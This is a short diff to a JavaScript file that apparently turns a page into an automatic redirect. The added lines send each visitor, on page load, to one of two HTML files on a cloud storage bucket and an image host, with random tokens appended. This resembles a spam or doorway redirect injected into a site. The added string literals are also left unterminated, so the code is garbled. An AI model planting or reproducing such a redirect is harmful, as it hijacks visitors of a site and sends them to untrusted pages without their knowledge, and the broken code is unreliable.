@@ -1,5 +1,6 @@
 var urls=[
-' http://baidu.com?{nnnnnnn}{wwww}',];
+' http://erp-huanan.oss-cn-shenzhen.aliyuncs.com/wms/product/html/nt2v2iw/2024/04/25/wms_product/nt2v2iw_20240425225748k0mog.html?{nnnnnnn}{wwww};
+' http://ksimg.sparke.cn/images/english/2024/4/0e944f30602e47e89b70dd1e63a788a6.html?{nnnnnnn}{wwww};];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
